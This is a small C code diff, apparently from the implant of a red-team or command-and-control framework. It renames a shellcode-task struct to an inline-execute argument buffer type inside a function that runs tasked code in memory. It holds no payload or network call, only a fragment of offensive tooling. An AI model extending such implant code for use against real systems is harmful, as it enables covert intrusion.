@@ -16,7 +16,7 @@ typedef struct __attribute__(( packed, scalar_storage_order( "big-endian" ) ))
 	UINT32	ArgLength;
 	UCHAR	Buf[ 0 ];
 	UCHAR	Arg[ 0 ];
-} SHELLCODE_TASK, *PSHELLCODE_TASK ;
+} INLINEEXECUTE_ARG_BUF, *PINLINE_EXECUTE_ARG_BUF ;
 
 typedef struct
 {
@@ -62,8 +62,8 @@ D_SEC( B ) DWORD TaskInlineExecute( _In_ PROGUE_CTX Context, _In_ USHORT Uid, _I
 	SIZE_T			Len = 0;
 
 	PVOID			Mem = NULL;
-	PSHELLCODE_TASK		Tsk = NULL;
 	INLINE_EXECUTE_FUNC	Fcn = NULL;
+	PINLINE_EXECUTE_ARG_BUF	Tsk = NULL;
 
 	/* Zero out stack structures */
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
